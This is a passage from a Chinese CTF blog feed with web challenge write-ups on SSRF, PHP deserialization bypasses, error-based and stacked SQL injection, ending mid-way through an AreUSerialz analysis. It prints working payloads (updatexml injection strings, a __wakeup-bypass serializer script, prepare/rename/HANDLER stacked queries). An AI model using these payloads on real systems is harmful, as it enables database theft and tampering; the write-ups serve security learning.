&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>get函数中存在curl函数的使用，猜测可能是ssrf漏洞，能通过构造特定的网页请求对内网进行操作，后边getBlogContents函数能读取输入的blog，如果blog能构造出file:// + 目录便可以查看flag，然而在下面却对blog有严格的过滤，只能放弃了……</p>
</li>
<li><p>进入注册用户的主界面，观察url中有get请求，推测可能存在注入</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.2.png?raw=true"></p>
<p>试一下</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.3.png?raw=true"></p>
<p>好像可以，接着来</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.4.png?raw=true"></p>
<p>然鹅好像有过滤</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.5.png?raw=true"></p>
<p>尝试内联注释绕过</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.6.png?raw=true"></p>
<p>成功绕过，同时发现username显示的是注入的第二列的内容（注入点大概在这了）</p>
<p>爆表名</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.7.png?raw=true"></p>
<p>爆列名</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.8.png?raw=true"></p>
<p>查看内容</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.9.png?raw=true"></p>
</li>
<li><p>啊这……爆出来一个不知道什么玩意，猜测可能这里面存的是输入的内容传输的过程（明显的序列化字符串），如果是这样的话，说明对blog的验证只在后端有，所以说，如果我们能构造一下blog在传输过程中的样式，就可以进行对内网的操作了。</p>
<p>先构造序列化字符串</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.10.png?raw=true"></p>
<p>注入</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.11.png?raw=true"></p>
</li>
</ol>
</li>
</ul>
<pre><code> 得到flag。</code></pre>
<ul>
<li><h3 id="get的新姿势-1"><a href="#get的新姿势-1" class="headerlink" title="get的新姿势"></a>get的新姿势</h3><p><strong>01SSRF概念</strong></p>
<p>服务端请求伪造(Server-Side Request Forgery),指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>
<p><strong>02SSRF的原理</strong></p>
<p>很多web应用都提供了从其他的服务器上获取数据的功能。使用指定的URL，web应用便可以获取图片，下载文件，读取文件内容等。SSRF的实质是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。一般情况下， SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p>
<p><strong>03SSRF的主要攻击方式</strong></p>
<p>攻击者想要访问主机B上的服务，但是由于存在防火墙或者主机B是属于内网主机等原因导致攻击者无法直接访问主机B。而服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，从而获取主机B的一些信息</p>
<p><strong>04SSRF的危害</strong></p>
<p>1.内外网的端口和服务扫描</p>
<p>2.攻击运行在内网或本地的应用程序</p>
<p>3.对内网web应用进行指纹识别，识别企业内部的资产信息</p>
<p>4.攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）</p>
<h5 id="5-利用file协议读取本地敏感数据文件等（这次就用了file协议）"><a href="#5-利用file协议读取本地敏感数据文件等（这次就用了file协议）" class="headerlink" title="5.利用file协议读取本地敏感数据文件等（这次就用了file协议）"></a>5.利用file协议读取本地敏感数据文件等（这次就用了file协议）</h5><p>来自<a href="https://www.freebuf.com/">FreeBuf.COM</a></p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>web-9 攻防世界 Web_php_unserialize</title>
    <url>/2020/12/28/web-9/</url>
    <content><![CDATA[<h1 id="攻防世界-Web-php-unserialize"><a href="#攻防世界-Web-php-unserialize" class="headerlink" title="攻防世界 Web_php_unserialize"></a>攻防世界 Web_php_unserialize</h1><ul>
<li><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4></li>
<li><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4></li>
<li><h4 id="get的新姿势"><a href="#get的新姿势" class="headerlink" title="get的新姿势"></a>get的新姿势</h4></li>
</ul>
<a id="more"></a>

<ul>
<li><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3></li>
</ul>
<p>​       没什么可说的，简单的PHP反序列化漏洞，存在两个过滤需要绕过。</p>
<ul>
<li><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>源码泄露，开局一串PHP代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>显然是一个反序列化漏洞，存在两个过滤需要绕过：</p>
<ol>
<li>正则表达式过滤了形如：(o~c):(数字)这种样式的字符串，但是我们可以在数字前面加一个+就能绕过。</li>
<li>类中调用了_wakeup函数，将file变量指向了index.php，但当传入的字符串经反序列化后的变量数量比类中原来的要多，则自动跳过wakeip函数。</li>
</ol>
<p>由此可以写一个绕过的脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Demo();</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$s</span> = str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$s</span> = str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$var</span> = base64_encode(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后得到flag</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-9.1.png?raw=true"></p>
</li>
<li><h4 id="get的新姿势-1"><a href="#get的新姿势-1" class="headerlink" title="get的新姿势"></a>get的新姿势</h4></li>
</ul>
<p>​        PHP反序列化在类名和变量名中间存在一个%00字符，然而这个字符是不显示的，因此在本题中如果先打印出来字符串再手动修改后再base64编码，最后得到的结果和直接操作得到的结果是不同的。</p>
]]></content>
  </entry>
  <entry>
    <title>web-11 buuoj [GXYCTF2019]BabySQli</title>
    <url>/2020/12/31/web-11/</url>
    <content><![CDATA[<h1 id="web-11-GXYCTF2019-BabySQli"><a href="#web-11-GXYCTF2019-BabySQli" class="headerlink" title="web-11 [GXYCTF2019]BabySQli"></a>web-11 [GXYCTF2019]BabySQli</h1><ul>
<li><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4></li>
<li><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4></li>
<li><h4 id="get的新姿势"><a href="#get的新姿势" class="headerlink" title="get的新姿势"></a>get的新姿势</h4></li>
</ul>
<a id="more"></a>

<ul>
<li><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>有登录框，可能存在sql注入，发现username可以进行注入。</li>
<li>查看网页源码发现有提示，可经解码得到正确语句。</li>
<li>判断是先查username再查password，可以利用联合查询的特点来解决。</li>
</ol>
</li>
<li><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><ol>
<li><p>往输入框里随便输点东西，然后查看源码。</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-12.1.png?raw=true"></p>
</li>
<li><p>只有大写字母和数字，大概是base家族的编码，实验后是先base32再base64</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-12.2.png?raw=true"></p>
</li>
<li><p>先测试注入点。</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-12.3.png?raw=true"></p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-12.4.png?raw=true"></p>
<p>注入点是第二列，猜测三列对应的是id，username，password。</p>
</li>
<li><p>提示说明username和password的验证是分开的，先验证username再验证password，如果都成功就能登录成功，username=admin能猜出来，而password可以利用union select的性质。联合查询不存在的数据时，先会创造一个虚拟的表，此时也会出现一个临时数据，所以如果我们先创造后查询，就可以绕过password的验证了（类似一种欺骗吧）。</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-12.5.png?raw=true"></p>
</li>
</ol>
</li>
</ul>
<ul>
<li><h3 id="get的新姿势-1"><a href="#get的新姿势-1" class="headerlink" title="get的新姿势"></a>get的新姿势</h3><p>又多了种绕过的奇怪姿势……</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>web-10 buuoj [极客大挑战 2019]HardSQL</title>
    <url>/2020/12/31/web-10/</url>
    <content><![CDATA[<h2 id="buuoj-极客大挑战-2019-HardSQL"><a href="#buuoj-极客大挑战-2019-HardSQL" class="headerlink" title="buuoj [极客大挑战 2019]HardSQL"></a>buuoj [极客大挑战 2019]HardSQL</h2><ul>
<li><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4></li>
<li><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4></li>
<li><h4 id="get的新姿势"><a href="#get的新姿势" class="headerlink" title="get的新姿势"></a>get的新姿势</h4></li>
</ul>
<a id="more"></a>

<ul>
<li><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>极客大挑战2019SQL系列第三题，经过尝试，union和盲注的一系列函数关键字都被过滤，考虑报错注入。</p>
</li>
<li><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><ol>
<li><p>采用updatexml语句进行报错注入。</p>
<p>本题中空格被过滤，但可以考虑用/**/或（）来绕过；而且大于小于等于号也被过滤，而‘=’在select查询时可用like代替（模糊查询）。</p>
</li>
<li><p>爆库名<code>or(updatexml(1,concat(0x7e,(select(database())),0x7e),1))%23</code></p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-10.1.png?raw=true"></p>
</li>
<li><p>爆表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or(updatexml(1,concat(0x7e(select(group_concat(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))),0x7e),1))%23</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-10.2.png?raw=true"></p>
</li>
<li><p>爆列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or(updatexml(1,concat(0x7e(select(group_concat(column_name)from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))),0x7e),1))%23</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-10.3.png?raw=true"></p>
</li>
<li><p>爆password字段，这里只能显示部分，因为substr被过滤，于是用了个骚操作，left和right各取一段然后手动拼起来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or(updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsql)),0x7e),1))%23</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-10.5.png?raw=true"></p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-10.4.png?raw=true"></p>
</li>
</ol>
</li>
</ul>
<ul>
<li><h3 id="get的新姿势-1"><a href="#get的新姿势-1" class="headerlink" title="get的新姿势"></a>get的新姿势</h3><ul>
<li><h5 id="extractvalue和updatexml的报错注入"><a href="#extractvalue和updatexml的报错注入" class="headerlink" title="extractvalue和updatexml的报错注入"></a>extractvalue和updatexml的报错注入</h5><p>本质就是在参数中的xpath语句语法错误时，先执行一下xpath语句判断正误，再抛出错误，也就相当于一次查询。</p>
<p>详情链接<a href="https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html">https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html</a></p>
</li>
<li><h5 id="floor式的报错注入"><a href="#floor式的报错注入" class="headerlink" title="floor式的报错注入"></a>floor式的报错注入</h5><p><a href="https://blog.csdn.net/he_and/article/details/80455884">https://blog.csdn.net/he_and/article/details/80455884</a></p>
</li>
</ul>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>web-12 sql堆叠注入绕过的骚姿势</title>
    <url>/2021/01/08/web-12/</url>
    <content><![CDATA[<h2 id="buuoj-强网杯-2019-随便注-amp-GYCTF2020-Blacklist"><a href="#buuoj-强网杯-2019-随便注-amp-GYCTF2020-Blacklist" class="headerlink" title="buuoj [强网杯 2019]随便注 &amp; [GYCTF2020]Blacklist"></a>buuoj [强网杯 2019]随便注 &amp; [GYCTF2020]Blacklist</h2><p>拿这两个题开刀总结一下堆叠注入的各种骚姿势。</p>
<h4 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a>堆叠注入：</h4><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询<br>原理很简单，mysql_multi_query() 支持多条sql语句同时执行，就是个;分隔，成堆的执行sql语句，例如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> users;show databases; </span><br></pre></td></tr></table></figure>

<p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够<br>虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。（<a href="https://blog.csdn.net/qq_45691294/article/details/107376284">原文</a>）</p>
<a id="more"></a>

<ul>
<li><h3 id="set预编译"><a href="#set预编译" class="headerlink" title="set预编译"></a>set预编译</h3><ul>
<li><h5 id="预编译："><a href="#预编译：" class="headerlink" title="预编译："></a>预编译：</h5><p>详细介绍见<a href="https://www.cnblogs.com/micrari/p/7112781.html">sql预编译</a>。</p>
<p>说人话就是提前把执行的语句编译好，然后你无论输入什么东西都会给你直接当成要查询的值处理（sql注入是在编译时实现的，没有编译的sql注入也就没什么卵用了），这是预编译防止sql注入的原理。</p>
</li>
<li><h5 id="本题的骚姿势："><a href="#本题的骚姿势：" class="headerlink" title="本题的骚姿势："></a>本题的骚姿势：</h5><p>因为过滤了select关键字，因此可以通过sql来拼接出select，因为预编译语句是可以执行concat的，于是可以构造下面的playload。(还有大小写绕过)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">Set @sql=CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect * <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">Prepare stmt from @sql;</span></span><br><span class="line"><span class="string">execute stmt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><h3 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h3><ul>
<li><h5 id="思考过程："><a href="#思考过程：" class="headerlink" title="思考过程："></a>思考过程：</h5><p>输入1的时候会显示内容，说明在后端执行了对应的sql语句进行查询，那其实就可以通过修改表名和属性值，在不改变原始的sql语句的条件下，让它可以查询我们想要的内容。</p>
</li>
<li><h5 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h5><p>sql中可以用alter语句来修改表的属性，于是可以构造以下的playload。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">rename table `words` to `test`;</span></span><br><span class="line"><span class="string">rename table `1919810931114514` to `words`;</span></span><br><span class="line"><span class="string">alter table `words` change `flag` `id` varchar(100);</span></span><br><span class="line"><span class="string">show columns from words;--+</span></span><br><span class="line"><span class="string"># ALTER TABLE tiger (表名) CHANGE tigername(要修改的列) name (修改后的列名) VARCHAR(20)(类型);</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><h3 id="handler语句查询"><a href="#handler语句查询" class="headerlink" title="handler语句查询"></a>handler语句查询</h3><ul>
<li><h5 id="handler的说明"><a href="#handler的说明" class="headerlink" title="handler的说明"></a>handler的说明</h5><p>handler有部分select的功能，但是它是mysql独有的，因此不包含在SQL标准里。</p>
<p>详情如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [<span class="keyword">AS</span>] alias]</span><br><span class="line"><span class="comment"># 打开一张表，无返回结果，实际上声明了一个名为tb1_name的句柄。</span></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"><span class="comment"># 获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</span></span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"><span class="comment"># 关闭打开的句柄。</span></span><br></pre></td></tr></table></figure>

<p>playload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">handler `1919810931114514` open;</span></span><br><span class="line"><span class="string">handler `1919810931114514` read first;</span></span><br><span class="line"><span class="string">handler `1919810931114514` close;-- +</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>web-13 buuoj [网鼎杯 2020 青龙组]AreUSerialz</title>
    <url>/2021/01/11/web-13/</url>
    <content><![CDATA[<h1 id="buuoj-网鼎杯-2020-青龙组-AreUSerialz"><a href="#buuoj-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="buuoj [网鼎杯 2020 青龙组]AreUSerialz"></a>buuoj [网鼎杯 2020 青龙组]AreUSerialz</h1><h4 id="最近比较懒就不搞些花里胡哨的了。。。"><a href="#最近比较懒就不搞些花里胡哨的了。。。" class="headerlink" title="最近比较懒就不搞些花里胡哨的了。。。"></a>最近比较懒就不搞些花里胡哨的了。。。</h4><p>直接上解题过程了</p>
<p>显然这是个php代码设计（有亿点长）</p>
<a id="more"></a>

<h5 id="瞅瞅源码"><a href="#瞅瞅源码" class="headerlink" title="瞅瞅源码"></a>瞅瞅源码</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;              </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;                         </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>哦，又是反序列化漏洞，那我们只需要重点关注一下destruct函数干了什么就好。</p>
<h4 id="突破点："><a href="#突破点：" class="headerlink" title="突破点："></a>突破点：</h4><ol>
<li>write函数没什么用，重点是如何利用好read函数。</li>
<li>注意到destruct中op的比较是强比较，而process中的op的比较是弱比较，那只要传一个数字类型的op=2就可以进入read函数了。</li>
<li>读文件可以用PHP伪协议来实现。</li>
</ol>
